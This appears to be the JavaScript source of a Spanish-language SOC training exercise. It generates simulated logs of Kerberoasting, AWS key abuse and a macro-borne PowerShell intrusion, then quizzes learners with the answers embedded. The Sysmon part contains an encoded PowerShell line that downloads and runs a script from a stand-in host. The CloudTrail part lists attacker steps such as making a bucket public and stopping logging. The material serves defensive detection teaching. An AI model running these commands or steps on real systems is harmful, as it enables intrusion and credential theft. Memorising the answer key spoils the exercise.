/* Escritorio 5 (N2) — práctica de detección con incidentes avanzados simulados */
'use strict';

(() => {
  // PRNG con semilla: los datos son siempre iguales y las respuestas verificables
  const rng = (s => () => (s = (s * 1664525 + 1013904223) >>> 0) / 4294967296)(4242);
  const pick = a => a[Math.floor(rng() * a.length)];
  const pad = n => String(n).padStart(2, '0');
  const iso = t => new Date(t).toISOString().replace(/\.\d+Z$/, 'Z');
  const win = t => { const d = new Date(t); return `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`; };
  const csv = a => a.map(x => /[",]/.test(String(x)) ? `"${String(x).replace(/"/g, '""')}"` : x).join(',');

  /* ---------- 1) Dominio corp.lab: Kerberoasting → movimiento lateral → privilegios */
  function kerberos() {
    const L = ['TimeCreated,EventID,Computer,Account,SourceIP,Detail'];
    let t = Date.UTC(2026, 9, 20, 7, 30, 0);
    const users = ['a.garcia', 'j.martin', 'l.sanchez', 'p.ruiz', 'c.navarro', 'm.lopez', 'r.diaz'];
    const ips = { 'a.garcia': '192.168.57.104', 'j.martin': '192.168.57.108', 'l.sanchez': '192.168.57.111', 'p.ruiz': '192.168.57.112',
      'c.navarro': '192.168.57.120', 'm.lopez': '192.168.57.115', 'r.diaz': '192.168.57.131' };
    const spns = ['MSSQLSvc/srv01.corp.lab:1433 (svc_sql)', 'HTTP/intranet.corp.lab (svc_web)', 'CIFS/srv01.corp.lab (SRV01$)', 'LDAP/dc01.corp.lab (DC01$)', 'HOST/ws01.corp.lab (WS01$)'];
    for (let i = 0; i < 140; i++) {
      t += 20000 + Math.floor(rng() * 90000);
      const u = pick(users), ip = ips[u];
      const r = rng();
      if (r < .45) L.push(csv([win(t), 4769, 'DC01', u, ip, `ServiceName=${pick(spns)} TicketEncryptionType=0x12 Status=0x0`]));
      else if (r < .75) L.push(csv([win(t), 4624, pick(['SRV01', 'WS01', 'DC01']), u, ip, 'LogonType=3 AuthenticationPackage=Kerberos']));
      else if (r < .9) L.push(csv([win(t), 4768, 'DC01', u, ip, 'TicketEncryptionType=0x12 PreAuthType=2 Status=0x0']));
      else L.push(csv([win(t), 4625, 'WS01', u, ip, 'LogonType=2 Status=0xC000006A (contraseña incorrecta)']));
    }
    // ráfaga RC4 desde m.lopez
    t += 60000;
    const roast = ['MSSQLSvc/srv01.corp.lab:1433 (svc_sql)', 'HTTP/intranet.corp.lab (svc_web)', 'backup/srv01.corp.lab (svc_backup)', 'SCCM/srv01.corp.lab (svc_sccm)', 'exchangeMDB/mail.corp.lab (svc_exch)'];
    for (const s of roast) { t += 700 + Math.floor(rng() * 600); L.push(csv([win(t), 4769, 'DC01', 'm.lopez', '192.168.57.115', `ServiceName=${s} TicketEncryptionType=0x17 Status=0x0`])); }
    for (let i = 0; i < 25; i++) { t += 30000 + Math.floor(rng() * 60000); const u = pick(users); L.push(csv([win(t), 4769, 'DC01', u, ips[u], `ServiceName=${pick(spns)} TicketEncryptionType=0x12 Status=0x0`])); }
    t += 47 * 60000;
    L.push(csv([win(t), 4624, 'SRV01', 'svc_sql', '192.168.57.115', 'LogonType=3 AuthenticationPackage=NTLM']));
    t += 5000; L.push(csv([win(t), 4672, 'SRV01', 'svc_sql', '192.168.57.115', 'Privilegios especiales asignados: SeDebugPrivilege SeBackupPrivilege']));
    t += 9000; L.push(csv([win(t), 7045, 'SRV01', 'LocalSystem', '', 'Servicio instalado: Name=WinSvcHelper ImagePath=%SystemRoot%\\Temp\\wsh.exe StartType=demand']));
    t += 4000; L.push(csv([win(t), 4688, 'SRV01', 'SYSTEM', '', 'NewProcess=C:\\Windows\\Temp\\wsh.exe ParentProcess=C:\\Windows\\System32\\services.exe']));
    t += 8 * 60000; L.push(csv([win(t), 4624, 'DC01', 'svc_backup', '192.168.57.115', 'LogonType=3 AuthenticationPackage=Kerberos']));
    t += 20000; L.push(csv([win(t), 4728, 'DC01', 'svc_backup', '192.168.57.115', 'Miembro añadido a grupo global de seguridad: Member=CN=m.lopez Group=Domain Admins']));
    t += 3000; L.push(csv([win(t), 4662, 'DC01', 'm.lopez', '192.168.57.115', 'Operación en objeto DS: Properties={1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes)']));
    for (let i = 0; i < 15; i++) { t += 40000 + Math.floor(rng() * 90000); const u = pick(users); L.push(csv([win(t), 4624, pick(['SRV01', 'WS01']), u, ips[u], 'LogonType=3 AuthenticationPackage=Kerberos'])); }
    return L;
  }

  /* ---------- 2) AWS CloudTrail: clave de CI filtrada */
  function cloudtrail() {
    const L = [];
    let t = Date.UTC(2026, 9, 22, 2, 0, 0);
    const ev = (user, ip, name, src, params, extra = {}) => JSON.stringify({ eventTime: iso(t), eventSource: src, eventName: name, awsRegion: 'eu-west-1',
      sourceIPAddress: ip, userAgent: extra.ua || 'aws-cli/2.17.4 Python/3.12 Linux', userIdentity: { type: 'IAMUser', userName: user, accessKeyId: extra.key || 'AKIAEXAMPLECI0DEPLOY' },
      requestParameters: params, errorCode: extra.err });
    const normal = [['ci-deployer', '20.61.14.9', 'PutObject', 's3.amazonaws.com', { bucketName: 'corp-web-static', key: 'index.html' }],
      ['ci-deployer', '20.61.14.9', 'UpdateFunctionCode', 'lambda.amazonaws.com', { functionName: 'facturas-api' }],
      ['ana.ops', '81.40.12.7', 'DescribeInstances', 'ec2.amazonaws.com', {}],
      ['ana.ops', '81.40.12.7', 'GetMetricData', 'monitoring.amazonaws.com', {}],
      ['backup-svc', '10.20.1.15', 'PutObject', 's3.amazonaws.com', { bucketName: 'corp-backups-prod', key: 'db/2026-10-22.sql.gz.enc' }]];
    for (let i = 0; i < 90; i++) { t += 60000 + Math.floor(rng() * 400000); const n = pick(normal); L.push(ev(n[0], n[1], n[2], n[3], n[4], n[0] === 'ana.ops' ? { key: 'ASIAEXAMPLEANAOPS01' } : n[0] === 'backup-svc' ? { key: 'AKIAEXAMPLEBACKUP01' } : {})); }
    const A = '198.51.100.23', ua = { ua: 'Boto3/1.34.0 Python/3.11 Linux/6.1 Botocore/1.34.0' };
    const steps = [['GetCallerIdentity', 'sts.amazonaws.com', {}], ['ListBuckets', 's3.amazonaws.com', {}], ['ListUsers', 'iam.amazonaws.com', {}],
      ['GetBucketPolicy', 's3.amazonaws.com', { bucketName: 'corp-backups-prod' }], ['GetObject', 's3.amazonaws.com', { bucketName: 'corp-backups-prod', key: 'db/2026-10-21.sql.gz.enc' }],
      ['PutBucketPolicy', 's3.amazonaws.com', { bucketName: 'corp-backups-prod', bucketPolicy: { Statement: [{ Effect: 'Allow', Principal: '*', Action: 's3:GetObject', Resource: 'arn:aws:s3:::corp-backups-prod/*' }] } }],
      ['CreateUser', 'iam.amazonaws.com', { userName: 'backup-admin' }], ['AttachUserPolicy', 'iam.amazonaws.com', { userName: 'backup-admin', policyArn: 'arn:aws:iam::aws:policy/AdministratorAccess' }],
      ['CreateAccessKey', 'iam.amazonaws.com', { userName: 'backup-admin' }], ['StopLogging', 'cloudtrail.amazonaws.com', { name: 'org-trail' }]];
    t += 120000;
    L.push(ev('ci-deployer', A, 'ListRoles', 'iam.amazonaws.com', {}, { ...ua, err: 'AccessDenied' }));
    for (const [n, src, p] of steps) { t += 15000 + Math.floor(rng() * 50000); L.push(ev('ci-deployer', A, n, src, p, ua)); }
    for (let i = 0; i < 20; i++) { t += 60000 + Math.floor(rng() * 400000); const n = pick(normal); L.push(ev(n[0], n[1], n[2], n[3], n[4], n[0] === 'ana.ops' ? { key: 'ASIAEXAMPLEANAOPS01' } : n[0] === 'backup-svc' ? { key: 'AKIAEXAMPLEBACKUP01' } : {})); }
    return L;
  }

  /* ---------- 3) Sysmon en WS01: documento con macro → persistencia → acceso a LSASS */
  function sysmon() {
    const L = ['UtcTime,EventID,Image,ParentImage,User,Detail'];
    let t = Date.UTC(2026, 9, 23, 8, 40, 0);
    const u = 'CORP\\m.lopez';
    const norm = [[1, 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', 'C:\\Windows\\explorer.exe', ''],
      [1, 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Windows\\explorer.exe', ''],
      [3, 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', '', 'DestinationIp=142.250.184.4 DestinationPort=443'],
      [1, 'C:\\Windows\\System32\\svchost.exe', 'C:\\Windows\\System32\\services.exe', ''],
      [11, 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', '', 'TargetFilename=C:\\Users\\m.lopez\\AppData\\Local\\Temp\\Outlook Logging\\outlook.etl'],
      [1, 'C:\\Windows\\System32\\SearchProtocolHost.exe', 'C:\\Windows\\System32\\SearchIndexer.exe', '']];
    for (let i = 0; i < 70; i++) { t += 10000 + Math.floor(rng() * 50000); const n = pick(norm); L.push(csv([win(t), n[0], n[1], n[2], n[0] === 1 && n[2].includes('services') ? 'NT AUTHORITY\\SYSTEM' : u, n[3]])); }
    const enc = btoa(Array.from("IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.80/a.ps1')").map(c => c + '\0').join(''));
    const W = 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', PS = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
    t += 30000; L.push(csv([win(t), 11, 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', '', u, 'TargetFilename=C:\\Users\\m.lopez\\Downloads\\Factura_Octubre_2026.docm']));
    t += 20000; L.push(csv([win(t), 1, W, 'C:\\Windows\\explorer.exe', u, 'CommandLine="WINWORD.EXE" /n "C:\\Users\\m.lopez\\Downloads\\Factura_Octubre_2026.docm"']));
    t += 9000; L.push(csv([win(t), 1, PS, W, u, `CommandLine=powershell.exe -nop -w hidden -enc ${enc}`]));
    t += 2000; L.push(csv([win(t), 22, PS, '', u, 'QueryName=cdn-update-check.net QueryResults=203.0.113.80']));
    t += 1000; L.push(csv([win(t), 3, PS, '', u, 'DestinationIp=203.0.113.80 DestinationPort=443']));
    t += 4000; L.push(csv([win(t), 11, PS, '', u, 'TargetFilename=C:\\Users\\m.lopez\\AppData\\Roaming\\Microsoft\\upd.dll']));
    t += 3000; L.push(csv([win(t), 13, PS, '', u, 'TargetObject=HKU\\S-1-5-21-1004\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate Details=rundll32.exe C:\\Users\\m.lopez\\AppData\\Roaming\\Microsoft\\upd.dll,Start']));
    t += 2000; L.push(csv([win(t), 1, 'C:\\Windows\\System32\\rundll32.exe', PS, u, 'CommandLine=rundll32.exe C:\\Users\\m.lopez\\AppData\\Roaming\\Microsoft\\upd.dll,Start']));
    t += 60000; L.push(csv([win(t), 10, 'C:\\Windows\\System32\\rundll32.exe', '', u, 'TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1010']));
    t += 3000; L.push(csv([win(t), 3, 'C:\\Windows\\System32\\rundll32.exe', '', u, 'DestinationIp=203.0.113.80 DestinationPort=8443']));
    for (let i = 0; i < 25; i++) { t += 10000 + Math.floor(rng() * 50000); const n = pick(norm); L.push(csv([win(t), n[0], n[1], n[2], u, n[3]])); }
    return L;
  }

  const SETS = {
    kerb: { name: 'Dominio corp.lab (Windows)', file: 'corp-security.csv', gen: kerberos,
      story: 'El SOC ve un inicio de sesión raro de **svc_sql** en SRV01 a las 3 de la madrugada… o eso parece. Revisa los eventos del dominio y reconstruye la cadena completa.',
      qs: [
        ['¿Qué usuario pidió en ráfaga tickets de servicio con cifrado débil?', 'm.lopez', 'Filtra `4769` y luego `0x17`.'],
        ['¿Qué valor de TicketEncryptionType delata la técnica?', '0x17', 'RC4‑HMAC. En un dominio moderno lo normal es AES (0x12).'],
        ['¿Qué identificador ATT&CK tiene esta técnica?', 'T1558.003', 'Steal or Forge Kerberos Tickets: Kerberoasting.'],
        ['¿Qué cuenta de servicio usó después para moverse lateralmente?', 'svc_sql', 'Busca un 4624 desde la misma IP que la ráfaga.'],
        ['¿En qué equipo instaló un servicio?', 'SRV01', 'Evento 7045.'],
        ['¿Qué evento indica que se añadió una cuenta a Domain Admins?', '4728', 'Miembro añadido a un grupo global de seguridad.'],
      ] },
    cloud: { name: 'AWS CloudTrail', file: 'cloudtrail.jsonl', gen: cloudtrail,
      story: 'Una alerta de GuardDuty avisa de llamadas a la API desde una IP nueva con las credenciales del pipeline de CI. Tienes los eventos de CloudTrail en formato JSON (una línea por evento). Prueba también `jq` en la terminal.',
      qs: [
        ['¿Desde qué IP actúa el atacante?', '198.51.100.23', 'Compara sourceIPAddress de ci-deployer con lo habitual.'],
        ['¿De qué usuario IAM es la clave filtrada?', 'ci-deployer', 'userIdentity.userName'],
        ['¿Qué bucket hizo público?', 'corp-backups-prod', 'eventName PutBucketPolicy con Principal "*".'],
        ['¿Qué usuario creó para mantener el acceso?', 'backup-admin', 'CreateUser'],
        ['¿Qué política le adjuntó?', 'AdministratorAccess', 'AttachUserPolicy'],
        ['¿Qué eventName intenta dejarte a ciegas?', 'StopLogging', 'Es una de las primeras alertas que debes tener configuradas.'],
      ] },
    sysmon: { name: 'Sysmon en WS01', file: 'ws01-sysmon.csv', gen: sysmon,
      story: 'El EDR marca un acceso sospechoso a **lsass.exe** en WS01. Tienes los eventos Sysmon del puesto de m.lopez. Encuentra el vector de entrada, la persistencia y el objetivo.',
      qs: [
        ['¿Qué proceso lanzó PowerShell? (nombre del ejecutable)', 'WINWORD.EXE', 'EventID 1 con ParentImage. Word lanzando PowerShell casi nunca es legítimo.'],
        ['¿A qué IP se conectó para descargar la segunda fase?', '203.0.113.80', 'EventID 3 y 22. Decodifica el -enc en CyberChef: From Base64 → Decode text UTF‑16LE.'],
        ['¿Qué nombre de valor usa la persistencia en Run?', 'OneDriveUpdate', 'EventID 13: cambio en el registro.'],
        ['¿Qué identificador ATT&CK corresponde a esa persistencia?', 'T1547.001', 'Boot or Logon Autostart Execution: Registry Run Keys.'],
        ['¿Qué EventID de Sysmon registra el acceso a la memoria de LSASS?', '10', 'ProcessAccess. GrantedAccess 0x1010 es típico de volcado de credenciales.'],
        ['¿Cómo se llama el documento malicioso?', 'Factura_Octubre_2026.docm', 'EventID 11 de Outlook: el adjunto guardado.'],
      ] },
  };

  CL.views.logs = (wrap) => {
    const st = CL.views.logs.st ||= { set: 'kerb', re: '', only: false, ans: {} };
    const draw = () => {
      const S = SETS[st.set];
      const lines = S._l ||= S.gen();
      wrap.innerHTML = `<h1>🔎 Práctica de detección avanzada</h1>
        <p class="mut">Incidentes realistas de nivel avanzado (dominio, cloud y endpoint). Súbelos a Splunk (Docker) para cazar con SPL, o usa el filtro (texto o expresión regular) como harías con <code>grep -E</code>, responde a las preguntas y descarga el log para repetirlo en la terminal con <code>grep</code>, <code>awk</code>, <code>sort | uniq -c</code>.</p>
        <div class="filters">${Object.entries(SETS).map(([k, s]) => `<button data-s="${k}" class="${k === st.set ? 'on' : ''}">${s.name}</button>`).join('')}</div>
        <blockquote><p>🕵️ ${CL.inline(S.story)}</p></blockquote>
        <div class="row"><input id="re" placeholder="Filtro: texto o regex (ej. 0x17, 4769|4624, StopLogging, EventID 10)" value="${CL.esc(st.re)}" style="flex:1;font-family:var(--mono)">
          <label class="small"><input type="checkbox" id="only" ${st.only ? 'checked' : ''}> solo coincidencias</label>
          <button id="dl">⬇ Descargar ${S.file}</button></div>
        <div class="small mut mono" id="cnt" style="margin:6px 0"></div>
        <div class="logview" id="lv"></div>
        <div class="small mut" style="margin-top:6px">Equivalente en terminal: <code id="eq"></code></div>
        <h2>❓ Preguntas de la investigación</h2>
        <div id="qs">${S.qs.map((q, i) => {
          const k = st.set + i, a = st.ans[k] || '';
          const ok = a && a.trim().toLowerCase() === q[1].toLowerCase();
          return `<div class="box"><b>${i + 1}. ${CL.inline(q[0])}</b>
            <div class="row" style="margin-top:8px"><input data-k="${k}" data-i="${i}" value="${CL.esc(a)}" style="flex:1;font-family:var(--mono)" placeholder="tu respuesta">
            <span class="res">${ok ? '<span class="ok">✔ correcto</span>' : ''}</span>
            <button class="sm" data-h="${i}">pista</button></div><div class="hint small mut" style="display:none;margin-top:6px">${CL.inline(q[2])}</div></div>`;
        }).join('')}</div>
        <div class="box" style="border-color:var(--c)"><b>🏁 Informe final.</b> Cuando lo tengas, redacta en tus apuntes una <b>línea temporal</b> (hora → acción del atacante), los <b>IoC</b> (IPs, ficheros, cuentas), el <b>impacto</b> y las <b>acciones de contención y mejora</b>. Es exactamente lo que entrega un analista SOC.</div>`;
      const lv = CL.$('#lv', wrap);
      const apply = () => {
        let re = null;
        try { re = st.re ? new RegExp(st.re, 'gi') : null; CL.$('#re', wrap).style.borderColor = ''; }
        catch { CL.$('#re', wrap).style.borderColor = 'var(--red)'; }
        let n = 0;
        const out = [];
        for (const l of lines) {
          const hit = re && (re.lastIndex = 0, re.test(l));
          if (hit) n++;
          if (st.only && re && !hit) continue;
          let e = CL.esc(l);
          if (hit) { try { e = CL.esc(l).replace(new RegExp(CL.esc(st.re).replace(/&amp;|&lt;|&gt;/g, '.'), 'gi'), m => `<mark>${m}</mark>`); } catch { /* resaltado opcional */ } }
          out.push(`<div class="${hit ? 'hit' : ''}">${e}</div>`);
          if (out.length > 3000) break;
        }
        lv.innerHTML = out.join('');
        CL.$('#cnt', wrap).textContent = `${lines.length} líneas · ${re ? n + ' coincidencias' : 'sin filtro'}`;
        CL.$('#eq', wrap).textContent = st.re ? `grep -Ei '${st.re.replace(/'/g, "'\\''")}' ${S.file}${st.only ? '' : ' --color=always'} | less -R` : `less ${S.file}`;
      };
      apply();
      CL.$('#re', wrap).oninput = CL.debounce(e => { st.re = e.target.value; apply(); }, 150);
      CL.$('#only', wrap).onchange = e => { st.only = e.target.checked; apply(); };
      CL.$('#dl', wrap).onclick = () => {
        const a = document.createElement('a');
        a.href = URL.createObjectURL(new Blob([lines.join('\n') + '\n'], { type: 'text/plain' }));
        a.download = S.file; a.click(); setTimeout(() => URL.revokeObjectURL(a.href), 2000);
        CL.toast(`Guardado en Descargas. Muévelo a ~/CiberLab2/loot/ y practica con grep, jq o Splunk.`);
      };
      CL.$('.filters', wrap).onclick = e => { const b = e.target.closest('button'); if (b) { st.set = b.dataset.s; st.re = ''; draw(); } };
      CL.$$('#qs input', wrap).forEach(inp => inp.oninput = () => {
        st.ans[inp.dataset.k] = inp.value;
        const q = S.qs[+inp.dataset.i];
        inp.parentElement.querySelector('.res').innerHTML = inp.value.trim().toLowerCase() === q[1].toLowerCase() ? '<span class="ok">✔ correcto</span>' : '';
      });
      CL.$$('#qs [data-h]', wrap).forEach(b => b.onclick = () => { const h = b.closest('.box').querySelector('.hint'); h.style.display = h.style.display === 'none' ? 'block' : 'none'; });
    };
    draw();
  };
})();
